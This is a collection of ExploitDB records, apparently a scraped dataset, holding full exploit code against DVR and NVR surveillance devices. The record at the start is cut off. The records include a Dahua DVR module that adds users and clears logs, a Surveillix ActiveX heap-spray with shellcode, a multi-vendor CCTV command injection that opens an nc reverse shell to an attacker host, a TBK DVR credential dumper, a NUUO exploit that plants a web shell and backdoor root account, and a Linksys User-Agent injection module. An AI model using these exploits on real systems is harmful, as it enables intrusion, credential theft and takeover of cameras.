":" + datastore[\'PASSWORD\']\r\n# \t\t\t\tuserstring << "\\x3a\\x31\\x3a\\x31\\x2c\\x32\\x2c\\x33\\x2c\\x34\\x2c\\x35\\x2c\\x36\\x2c\\x37" +\r\n# \t\t\t\t     "\\x2c\\x38\\x2c\\x39\\x2c\\x31\\x30\\x2c\\x31\\x31\\x2c\\x32\\x30\\x2c\\x32\\x31" +\r\n# \t\t\t\t     "\\x2c\\x32\\x32\\x2c\\x32\\x33\\x2c\\x32\\x34\\x2c\\x32\\x35\\x2c\\x32\\x36\\x2c" +\r\n# \t\t\t\t     "\\x32\\x37\\x2c\\x32\\x38\\x2c\\x33\\x37\\x2c\\x33\\x38\\x2c\\x33\\x39\\x2c\\x34" +\r\n# \t\t\t\t     "\\x30\\x2c\\x34\\x32\\x2c\\x34\\x33\\x2c\\x34\\x34\\x2c\\x34\\x35\\x2c\\x34\\x36" +\r\n# \t\t\t\t     "\\x2c\\x34\\x37\\x2c\\x34\\x38\\x2c\\x34\\x39\\x2c\\x35\\x30\\x2c\\x35\\x31\\x2c" +\r\n# \t\t\t\t     "\\x35\\x32\\x2c\\x35\\x33\\x2c\\x35\\x34\\x2c\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35" +\r\n# \t\t\t\t     "\\x37\\x2c\\x35\\x38\\x2c\\x35\\x39\\x2c\\x36\\x30\\x3a\\x3a\\x31"\r\n# \r\n# \t\t\t\tu2 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n# \t\t\t\tu3 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n# \t\t\t\tu4 = "\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n# \t\t\t\tu5 = "\\xa6\\x00\\x00\\x00#{userstring.length.chr}\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     userstring\r\n# \t\t\t\tsock.put(u1)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u1)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u2)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u3)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u2)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u3)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u4)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(groups)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(users)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u5)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u2)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u3)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(u4)\r\n# \t\t\t\tsock.put(1024)\r\n# \t\t\t\tsock.put(groups)\r\n# \t\t\t\tsock.get(1024)\r\n# \t\t\t\tsock.put(users)\r\n# \t\t\t\tsock.put(1024)\r\n# \t\t\t\tprint_good("ADDED USER!: user #{datastore[\'USERNAME\']}\'s password is #{datastore[\'PASSWORD\']}")\r\n# \t\t\t\t\r\n# \t\t\telse\r\n\t\t\tend\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tif (datastore[\'CLEAR_LOGS\'])\r\n\t\t\t\tsock.put(clear_logs)\r\n\t\t\t\tsock.put(clear_logs2)\r\n\t\t\t\tprint_good("LOGS CLEARED! @ #{rhost}:#{rport}")\r\n\t\t\tend\r\n\t\t\tdisconnect()\r\n\t\tend\r\n        end\r\n\r\nend', 'description': 'Dahua DVR 2.608.0000.0/2.608.GV00.0 - Authentication Bypass (Metasploit)', 'author': 'Jake Reynolds', '_id': 29673, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-11-18T00:00:00+00:00', 'cve': ['CVE-2013-6117', 'CVE-2013-3612', 'CVE-2013-3613', 'CVE-2013-3614', 'CVE-2013-3615'], 'type': 'webapps', 'port': 37777}
{'code': 'source: http://www.securityfocus.com/bid/27360/info\r\n\r\nSurveillix DVR \'MeIpCamX.DLL\' ActiveX control is prone to multiple buffer-overflow vulnerabilities because the application fails to perform adequate boundary checks on user-supplied data.\r\n\r\nSuccessfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.\r\n\r\nThese issues affect \'MeIpCamX.DLL\' 1.0.0.4; other versions may also be vulnerable. \r\n\r\n<!-- Toshiba Surveillance (Surveillix) RecordSend Class (MeIpCamX.DLL 1.0.0.4) remote buffer overflow exploit (IE7/xpsp2) a demo camera: http://wb02-demo.surveillixdvrsupport.com/Ctl/index.htm?Cus?Audio codebase: http://wb02-demo.surveillixdvrsupport.com/Ctl/MeIpCamX.cab rgod-tsid-pa-he-ru-ka - stay tuned with us ... http://retrogod.altervista.org/join.html security feeds, radio streams, techno/drum & bass stations to come --> <html> <object classid=\'clsid:AD315309-EA00-45AE-9E8E-B6A61CE6B974\' id=\'RecordSend\' /> </object> <script language="javascript"> ///add su one, user: sun pass: tzu shellcode = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u3749%u4949" + "%u4949%u4949%u4949%u4949%u4949%u4949%u5a51%u456a" + "%u5058%u4230%u4231%u6b41%u4141%u3255%u4241%u3241" + "%u4142%u4230%u5841%u3850%u4241%u6d75%u6b39%u494c" + "%u5078%u3344%u6530%u7550%u4e50%u716b%u6555%u6c6c" + "%u614b%u676c%u3175%u6568%u5a51%u4e4f%u306b%u564f" + "%u4c78%u414b%u774f%u4450%u4841%u576b%u4c39%u664b" + "%u4c54%u444b%u7841%u466e%u6951%u4f50%u6c69%u6b6c" + "%u6f34%u3330%u6344%u6f37%u6a31%u646a%u474d%u4871" + "%u7842%u4c6b%u6534%u716b%u5144%u6334%u7434%u5835" + "%u6e65%u736b%u646f%u7364%u5831%u756b%u4c36%u644b" + "%u624c%u6c6b%u634b%u656f%u574c%u7871%u4c6b%u774b" + "%u4c6c%u464b%u7861%u4f6b%u7379%u516c%u3334%u6b34" + "%u7073%u4931%u7550%u4e34%u536b%u3470%u4b70%u4f35" + "%u7030%u4478%u4c4c%u414b%u5450%u4c4c%u624b%u6550" + "%u6c4c%u6e6d%u626b%u6548%u6858%u336b%u6c39%u4f4b" + "%u4e70%u5350%u3530%u4350%u6c30%u704b%u3568%u636c" + "%u366f%u4b51%u5146%u7170%u4d46%u5a59%u6c58%u5943" + "%u6350%u364b%u4230%u7848%u686f%u694e%u3170%u3370" + "%u4d58%u6b48%u6e4e%u346a%u464e%u3937%u396f%u7377" + "%u7053%u426d%u6444%u756e%u5235%u3058%u6165%u4630" + "%u654f%u3133%u7030%u706e%u3265%u7554%u7170%u7265" + "%u5353%u7055%u5172%u5030%u4273%u3055%u616e%u4330" + "%u7244%u515a%u5165%u5430%u526f%u5161%u3354%u3574" + "%u7170%u5736%u4756%u7050%u306e%u7465%u4134%u7030" + "%u706c%u316f%u7273%u6241%u614c%u4377%u6242%u524f" + "%u3055%u6770%u3350%u7071%u3064%u516d%u4279%u324e" + "%u7049%u5373%u5244%u4152%u3371%u3044%u536f%u4242" + "%u6153%u5230%u4453%u5035%u756e%u3470%u506f%u6741" + "%u7734%u4734%u4570"); bigblock = unescape("%u9090%u9090"); headersize = 20; slackspace = headersize+shellcode.length; while (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (i=0;i<444;i++){memory[i] = block+shellcode} //thx to Solar Designer and metasploit crew, is always intended puf=""; for (i=0;i<28;i++){puf = puf + unescape("%0e")} //no more than 28, otherwise you fall in seh tricks RecordSend.SetPort(puf); //SetIpAddress method is vulnerable too, check by yourself </script> </html>', 'description': "Toshiba Surveillance Surveillix DVR 'MeIpCamX.dll' 1.0 - ActiveX Control Buffer Overflow", 'author': 'rgod', '_id': 31040, 'source': 'ExploitDB', 'platform': 'windows', 'date': '2008-01-20T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '#!/usr/bin/python\r\n\r\n# Blog post: http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html\r\n\r\n\'\'\'\r\nVendors List\r\n\r\nAdemco\r\nATS Alarmes technolgy and ststems\r\nArea1Protection\r\nAvio\r\nBlack Hawk Security\r\nCapture\r\nChina security systems\r\nCocktail Service\r\nCpsecured\r\nCP PLUS\r\nDigital Eye\'z no website\r\nDiote Service & Consulting\r\nDVR Kapta\r\nELVOX \r\nET Vision \r\nExtra Eye 4 U\r\neyemotion \r\nEDS \r\nFujitron \r\nFull HD 1080p\r\nGazer \r\nGoldeye \r\nGoldmaster\r\nGrizzly \r\nHD IViewer\r\nHi-View \r\nIpcom\r\nIPOX \r\nIR\r\nISC Illinois Security Cameras, Inc.\r\nJFL Alarmes \r\nLince \r\nLOT\r\nLux \r\nLynx Security \r\nMagtec \r\nMeriva Security \r\nMultistar \r\nNavaio\r\nNoVus \r\nOptivision \r\nPARA Vision\r\nProvision-ISR \r\nQ-See \r\nQuestek \r\nRetail Solution Inc\r\nRIT Huston .com \r\nROD Security cameras \r\nSatvision \r\nSav Technology\r\nSkilleye \r\nSmarteye \r\nSuperior Electrial Systems\r\nTechShell \r\nTechSon\r\nTechnomate \r\nTecVoz \r\nTeleEye \r\nTomura\r\ntruVue\r\nTVT \r\nUmbrella \r\nUnited Video Security System, Inc\r\nUniversal IT Solutions\r\nUS IT Express\r\nU-Spy Store\r\nVentetian \r\nV-Gurad Security\r\nVid8 \r\nVtek\r\nVision Line\r\nVisar\r\nVodotech.com \r\nVook \r\nWatchman \r\nXrplus \r\nYansi \r\nZetec\r\nZoomX\r\n\'\'\'\r\n\r\nfrom sys import argv\r\nimport optparse\r\nfrom urlparse import urlparse\r\nfrom re import compile\r\nimport socket\r\nimport requests\r\nfrom requests.exceptions import ConnectionError, Timeout, ContentDecodingError\r\nfrom socket import timeout\r\n\r\n\r\n\r\n\r\ndef main():\r\n\r\n    # parse command line options and atguments\r\n    optparser = optparse.OptionParser(usage="%s <target-url> [options]" % argv[0])\r\n    optparser.add_option(\'-c\',\'--check\',action="store_true",dest="checkvuln", default=False,\r\n                         help="Check if target is vulnerable")\r\n    optparser.add_option(\'-e\',\'--exploit\', action="store", type="string", dest="connback",\r\n                         help="Fire the exploit against the given target URL")\r\n\r\n    (options, args) = optparser.parse_args()\r\n\r\n    try:\r\n        target = args[0]\r\n    except IndexError:\r\n        optparser.print_help()\r\n        exit()\r\n\r\n    target_url = urlparse(target)\r\n\r\n    # validating hostname\r\n    if not target_url.hostname:\r\n        print "[X] supplied target \\"%s\\" is not a valid URL" % target\r\n        optparser.print_help()\r\n        exit()\r\n\r\n    # A little hack to handle read timeouts, since urllib2 doesnt give us this functionality.\r\n    socket.setdefaulttimeout(10)\r\n\r\n    # is -c flag on check if target url is vulnrable.\r\n    if options.checkvuln is True:\r\n        print "[!] Checking if target \\"%s\\" is vulnable..." % target_url.netloc\r\n        try:\r\n\r\n            # Write file\r\n            raw_url_request(\'%s://%s/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js\'\r\n                         % (target_url.scheme, target_url.netloc))\r\n\r\n            # Read the file.\r\n            response = raw_url_request(\'%s://%s/../../../../../../../mnt/mtd/test\' % (target_url.scheme, target_url.netloc))\r\n\r\n\r\n            # remove it..\r\n            raw_url_request(\'%s://%s//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js\'\r\n                         % (target_url.scheme, target_url.netloc))\r\n\r\n        except (ConnectionError, Timeout, timeout) as e:\r\n            print "[X] Unable to connect. reason: %s.  exiting..." % e.message\r\n            return\r\n        if response.text[0] != \'1\': \r\n            print "[X] Expected response content first char to be \'1\' got %s. exiting..." % response.text\r\n            return\r\n\r\n        print "[V] Target \\"%s\\" is vulnerable!" % target_url.netloc\r\n\r\n\r\n\r\n    # if -e is on then fire exploit,\r\n    if options.connback is not None:\r\n\r\n        # Validate connect-back information.\r\n        pattern = compile(\'(?P<host>[a-zA-Z0-9\\.\\-]+):(?P<port>[0-9]+)\')\r\n        match = pattern.search(options.connback)\r\n        if not match:\r\n            print "[X] given connect back \\"%s\\" should be in the format for host:port" % options.connback\r\n            optparser.print_help()\r\n            exit()\r\n\r\n        # fire remote code execution!\r\n\r\n        # Three ..\r\n        try:\r\n            raw_url_request(\'%s://%s/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a\'\r\n                        % (target_url.scheme, target_url.netloc, match.group(\'host\'), match.group(\'port\')))\r\n\r\n        # Two ...\r\n\r\n            raw_url_request(\'%s://%s/language/Swedish${IFS}&&echo${IFS}"-e${IFS}$SHELL${IFS}">>e&&${IFS}/a\'\r\n                         % (target_url.scheme, target_url.netloc))\r\n\r\n\r\n        # One. Left off!\r\n            raw_url_request(\'%s://%s/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s\'\r\n                         % (target_url.scheme, target_url.netloc))\r\n\r\n        except (ConnectionError, Timeout, timeout) as e:\r\n            print "[X] Unable to connect reason: %s.  exiting..." % e.message\r\n\r\n\r\n\r\n        print "[V] Exploit payload sent!, if nothing went wrong we should be getting a reversed remote shell at %s:%s" \\\r\n              % (match.group(\'host\'), match.group(\'port\'))\r\n\r\n\r\n# Disabling URL encode hack\r\ndef raw_url_request(url):\r\n    r = requests.Request(\'GET\')\r\n    r.url = url\r\n    r = r.prepare()\r\n    # set url without encoding\r\n    r.url = url\r\n\r\n    s = requests.Session()\r\n    return s.send(r)\r\n\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    main()', 'description': 'Multiple CCTV-DVR Vendors - Remote Code Execution', 'author': 'K1P0D', '_id': 39596, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2016-03-23T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '# -*- coding: utf-8 -*- \r\nimport json\r\nimport requests\r\nimport argparse\r\nimport tableprint as tp\r\n\r\nclass Colors:\r\n    BLUE        = \'\\033[94m\'\r\n    GREEN       = \'\\033[32m\'\r\n    RED         = \'\\033[0;31m\'\r\n    DEFAULT     = \'\\033[0m\'\r\n    ORANGE      = \'\\033[33m\'\r\n    WHITE       = \'\\033[97m\'\r\n    BOLD        = \'\\033[1m\'\r\n    BR_COLOUR   = \'\\033[1;37;40m\'\r\n\r\nbanner = \'\'\'\r\n                             __..--.._\r\n      .....              .--~  .....  `.\r\n    .":    "`-..  .    .\' ..-\'"    :". `\r\n    ` `._ ` _.\'`"(     `-"\'`._ \' _.\' \'\r\n         ~~~      `.          ~~~\r\n                  .\'\r\n                 /\r\n                (\r\n                 ^---\'\r\n\r\n\r\n [*] @capitan_alfa\r\n\'\'\'\r\n\r\ndetails = \'\'\' \r\n # Exploit Title:   DVRs; Credentials Exposed\r\n # Date:            09/04/2018\r\n # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )\r\n\'\'\'\r\nparser = argparse.ArgumentParser(prog=\'getDVR_Credentials.py\',\r\n                                description=\' [+] Obtaining Exposed credentials\', \r\n                                epilog=\'[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81\',\r\n                                version="1.1")\r\n\r\nparser.add_argument(\'--host\',   dest="HOST",    help=\'Host\',    required=True)\r\nparser.add_argument(\'--port\',   dest="PORT",    help=\'Port\',    default=80)\r\n\r\nargs    =   parser.parse_args()\r\n\r\nHST     =   args.HOST\r\nport    =   args.PORT\r\n\r\nheaders = {}\r\n\r\nfullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"\r\nhost        =   "http://"+HST+":"+str(port)+"/"\r\n\r\nprint Colors.GREEN+banner+Colors.DEFAULT\r\n\r\n\r\ndef makeReqHeaders(xCookie):\r\n    headers["Host"]             =  host\r\n    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"\r\n    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \r\n    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"\r\n    headers["Connection"]       = "close"\r\n    headers["Content-Type"]     = "text/html"\r\n    headers["Cookie"]           = "uid="+xCookie\r\n    \r\n    return headers\r\n\r\ntry:\r\n    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)\r\nexcept Exception,e:\r\n    print Colors.RED+" [+] Timed out\\n"+Colors.DEFAULT\r\n    exit()\r\n\r\nbadJson = rX.text\r\ntry:\r\n    dataJson = json.loads(badJson)\r\n    totUsr = len(dataJson["list"])   #--> 10\r\nexcept Exception, e:\r\n    print " [+] Error: "+str(e)\r\n    print " [>] json: "+str(rX)\r\n#    print " [>] Reuest: \\n"+str(makeReqHeaders(xCookie="admin"))\r\n    exit()\r\n\r\n\r\nprint Colors.GREEN+"\\n [+] DVR (url):\\t\\t"+Colors.ORANGE+str(host)+Colors.GREEN\r\nprint " [+] Port: \\t\\t"+Colors.ORANGE+str(port)+Colors.DEFAULT\r\n\r\nprint Colors.GREEN+"\\n [+] Users List:\\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT\r\nprint " "\r\n\r\nfinal_data = []\r\ntry:\r\n    for obj in range(0,totUsr):\r\n\r\n        temp = []\r\n\r\n        _usuario    = dataJson["list"][obj]["uid"]\r\n        _password   = dataJson["list"][obj]["pwd"]\r\n        _role       = dataJson["list"][obj]["role"]\r\n\r\n        temp.append(_usuario) \r\n        temp.append(_password)\r\n        temp.append(_role)\r\n\r\n        final_data.append(temp)\r\n\r\n        hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT\r\n        hdPass = Colors.GREEN + "Password" + Colors.DEFAULT\r\n        hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT\r\n\r\n        cabeceras = [hdUsr, hdPass, hdRole] \r\n\r\n    tp.table(final_data, cabeceras, width=20)\r\n\r\nexcept Exception, e:\r\n    print "\\n [!]: "+str(e)\r\n    print " [+] "+ str(dataJson)\r\n\r\nprint "\\n"', 'description': 'TBK DVR4104 / DVR4216 - Credentials Leak', 'author': 'ezelf', '_id': 44577, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2018-05-02T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '\ufeff#!/usr/bin/env python\r\n#\r\n#\r\n# NUUO Remote Root Exploit\r\n#\r\n#\r\n# Vendor: NUUO Inc.\r\n# Product web page: http://www.nuuo.com\r\n# Affected version: <=3.0.8\r\n#\r\n# Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS\r\n# functionality. Setup is simple and easy, with automatic port forwarding\r\n# settings built in. NVRmini 2 supports POS integration, making this the perfect\r\n# solution for small retail chain stores. NVRmini 2 also comes full equipped as\r\n# a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping\r\n# and RAID functions for data protection. Choose NVR and know that your valuable video\r\n# data is safe, always.\r\n#\r\n# Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from an unauthenticated command\r\n# injection vulnerability. Due to an undocumented and hidden debugging script, an attacker\r\n# can inject and execute arbitrary code as the root user via the \'log\' GET parameter in the \r\n# \'__debugging_center_utils___.php\' script.\r\n#\r\n# -----------------------------------------------------\r\n# $ nuuo.py 10.0.0.17 80\r\n# [*] ==============================================\r\n# [*] NUUO NVR/DVR/NDVR Remote Root Exploit\r\n# [*] Zero Science Lab - http://www.zeroscience.mk\r\n# [*] ==============================================\r\n# [*] Backdoor detected!\r\n# [*] Add root user (y/n)? n\r\n# [*] Press [ ENTER ] to start root shell...\r\n#\r\n# root@nuuo:~# id\r\n# uid=0(root) gid=0(root)\r\n#\r\n# root@nuuo:~# exit\r\n#\r\n# [*] Removing raidh.php file\r\n# [*] Session terminated!\r\n#\r\n# $\r\n# -----------------------------------------------------\r\n#\r\n# Tested on: GNU/Linux 3.0.8 (armv7l)\r\n#            GNU/Linux 2.6.31.8 (armv5tel)\r\n#            lighttpd/1.4.28\r\n#            PHP/5.5.3\r\n#\r\n#\r\n# Vulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n# Zero Science Lab - http://www.zeroscience.mk\r\n#\r\n#\r\n# Advisory ID: ZSL-2016-5348\r\n# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5348.php\r\n# NSE Script: http://www.zeroscience.mk/codes/nuuo-backdoor.nse\r\n# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40209.zip\r\n#\r\n#\r\n# 14.01.2016\r\n#\r\n\r\nimport os######\r\nimport sys#####\r\nimport time####\r\nimport urllib##\r\nimport binascii\r\nimport requests\r\n \r\n__author__ = \'lqwrm\'\r\n\r\ndef persist(host,port,hexy,clean):\r\n\r\n    pwd = \'\'\'echo \'roOt:x:0:0:PWNED account:/:/bin/bash\' >> /etc/passwd\'\'\'\r\n    sdw = \'\'\'echo \'roOt:$1$MJOnV/Y3$tDnMIBMy0lEQ2kDpfgTJP0:16914:0:99999:7:::\' >> /etc/shadow\'\'\'\r\n    print \'[*] Adding user \\\'roOt\\\' with password \\\'rewt\\\' in passwd file.\'\r\n    requests.get(\'http://\'+host+\':\'+port+\'/raidh.php?cmd=\'+pwd)\r\n    time.sleep(2)\r\n    \r\n    print \'[*] Updating shadow file.\'\r\n    requests.get(\'http://\'+host+\':\'+port+\'/raidh.php?cmd=\'+sdw)\r\n    time.sleep(2)\r\n    \r\n    print \'[*] Shell awaits: ssh roOt@\'+host\r\n    requests.get(\'http://\'+host+\':\'+port+\'/raidh.php?cmd=\'+urllib.quote(clean))\r\n    exit(0)\r\n\r\ndef check(host,port,hexy):\r\n\r\n    try:\r\n        r = requests.get(\'http://\'+host+\':\'+port+\'/\'+hexy, allow_redirects=False)\r\n        if r.status_code == 200:\r\n            print \'[*] Backdoor detected!\'\r\n            pass\r\n        else:\r\n            print \'[*] No backdoors here. :(\'\r\n            exit(0)\r\n    except Exception:\r\n        print \'[*] Could not connect.\'\r\n        exit(0)\r\n\r\ndef main():\r\n\r\n    print \'[*] ==============================================\'\r\n    print \'[*] NUUO NVR/DVR/NDVR Remote Root Exploit\'\r\n    print \'[*] Zero Science Lab - http://www.zeroscience.mk\'\r\n    print \'[*] ==============================================\'\r\n\r\n    if (len(sys.argv) <= 2):\r\n        print \'[*] Usage: nuuo.py <ipaddress> <port>\'\r\n        exit(0)\r\n\r\n    host = sys.argv[1]\r\n    port = sys.argv[2]\r\n\r\n    dbgcu = \'5f5f64\'#\r\n    dbgcu+= \'656275\'#\r\n    dbgcu+= \'676769\'#\r\n    dbgcu+= \'6e675f\'#\r\n    dbgcu+= \'63656e\'#\r\n    dbgcu+= \'746572\'#\r\n    dbgcu+= \'5f7574\'#\r\n    dbgcu+= \'696c73\'#\r\n    dbgcu+= \'5f5f5f\'#\r\n    dbgcu+= \'2e7068\'#\r\n    dbgcu+= \'70\'###\'#\r\n\r\n    hexy = binascii.unhexlify(dbgcu)\r\n    check (host,port,hexy)\r\n\r\n    payload = \'\'\'echo "<?php system(\\$_REQUEST[\\\'cmd\\\']); ?>" > raidh.php\'\'\'\r\n    requests.get(\'http://\'+host+\':\'+port+\'/\'+hexy+\'?log=1337;\' + payload)\r\n\r\n    clean = \'rm raidh.php\'\r\n    a1 = raw_input(\'[*] Add root user (y/n)? \')\r\n    if a1.strip() == \'y\' or a1.strip() == \'Y\':\r\n        persist (host,port,hexy,clean)\r\n    else:\r\n        pass\r\n\r\n    print \'[*] Press [ ENTER ] to start root shell...\'\r\n    raw_input()\r\n\r\n    while True:\r\n        try:\r\n            cmd = raw_input(\'root@nuuo:~# \')\r\n            if cmd.strip() == \'\':\r\n                print \'[*] Give me a command!\\n\'\r\n                continue\r\n            else:\r\n                e = requests.get(\'http://\'+host+\':\'+port+\'/raidh.php?cmd=\'+urllib.quote(cmd))\r\n                print e.text\r\n            if cmd.strip() == \'exit\':\r\n                print \'[*] Removing raidh.php file\'\r\n                requests.get(\'http://\'+host+\':\'+port+\'/raidh.php?cmd=\'+urllib.quote(clean))\r\n                print \'[*] Session terminated!\'\r\n                break\r\n        except Exception:\r\n            break\r\n\r\nif __name__ == "__main__":\r\n    main()', 'description': 'NUUO NVRmini 2 3.0.8 - Remote Code Execution', 'author': 'LiquidWorm', '_id': 40209, 'source': 'ExploitDB', 'platform': 'php', 'date': '2016-08-06T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 80}
{'code': '##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'        => \'Linksys WVBR0-25 User-Agent Command Execution\',\r\n      \'Description\' => %q{\r\n        The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect wireless Genie\r\n        cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41\r\n        of the web management portal via the User-Agent header. Authentication is not required to\r\n        exploit this vulnerability.\r\n      },\r\n      \'Author\'      =>\r\n        [\r\n          \'HeadlessZeke\' # Vulnerability discovery and Metasploit module\r\n        ],\r\n      \'License\'     => MSF_LICENSE,\r\n      \'References\'  =>\r\n        [\r\n          [\'CVE\', \'2017-17411\'],\r\n          [\'ZDI\', \'17-973\'],\r\n          [\'URL\', \'https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair\']\r\n        ],\r\n      \'DisclosureDate\' => \'Dec 13 2017\',\r\n      \'Privileged\'     => true,\r\n      \'Payload\'        =>\r\n        {\r\n          \'DisableNops\' => true,\r\n          \'Space\'       => 1024,\r\n          \'Compat\'      =>\r\n            {\r\n              \'PayloadType\' => \'cmd\',\r\n              \'RequiredCmd\' => \'generic netcat\'\r\n            }\r\n        },\r\n      \'Platform\'       => \'unix\',\r\n      \'Arch\'           => ARCH_CMD,\r\n      \'Targets\'        => [[ \'Automatic\', { }]],\r\n      \'DefaultTarget\'  => 0\r\n      ))\r\n  end\r\n\r\n  def check\r\n    check_str = rand_text_alpha(8)\r\n    begin\r\n      res = send_request_raw({\r\n        \'method\' => \'GET\',\r\n        \'uri\' => \'/\',\r\n        \'agent\' => "\\"; printf \\"#{check_str}"\r\n      })\r\n      if res && res.code == 200 && res.body.to_s.include?(Rex::Text.md5(check_str))\r\n        return Exploit::CheckCode::Vulnerable\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n  def exploit\r\n    print_status("#{peer} - Trying to access the device ...")\r\n\r\n    unless check == Exploit::CheckCode::Vulnerable\r\n      fail_with(Failure::NotVulnerable, "#{peer} - Failed to access the vulnerable device")\r\n    end\r\n\r\n    print_status("#{peer} - Exploiting...")\r\n\r\n    if datastore[\'PAYLOAD\'] == \'cmd/unix/generic\'\r\n      exploit_cmd\r\n    else\r\n      exploit_session\r\n    end\r\n  end\r\n\r\n  def exploit_cmd\r\n    beg_boundary = rand_text_alpha(8)\r\n\r\n    begin\r\n      res = send_request_raw({\r\n        \'method\' => \'GET\',\r\n        \'uri\'    => \'/\',\r\n        \'agent\' => "\\"; echo #{beg_boundary}; #{payload.encoded} #"\r\n      })\r\n\r\n      if res && res.code == 200 && res.body.to_s =~ /#{beg_boundary}/\r\n        print_good("#{peer} - Command sent successfully")\r\n        if res.body.to_s =~ /ret :.+?#{beg_boundary}(.*)/  # all output ends up on one line\r\n          print_status("#{peer} - Command output: #{$1}")\r\n        end\r\n      else\r\n        fail_with(Failure::UnexpectedReply, "#{peer} - Command execution failed")\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")\r\n    end\r\n  end\r\n\r\n  def exploit_session\r\n    begin\r\n      send_request_raw({\r\n        \'method\' => \'GET\',\r\n        \'uri\'    => \'/\',\r\n        \'agent\' => "\\"; #{payload.encoded} #"\r\n      })\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")\r\n    end\r\n  end\r\nend', 'description': 'Linksys WVBR0-25 - User-Agent Command Execution (Metasploit)', 'author': 'Metasploit', '_id': 43429, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2018-01-04T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
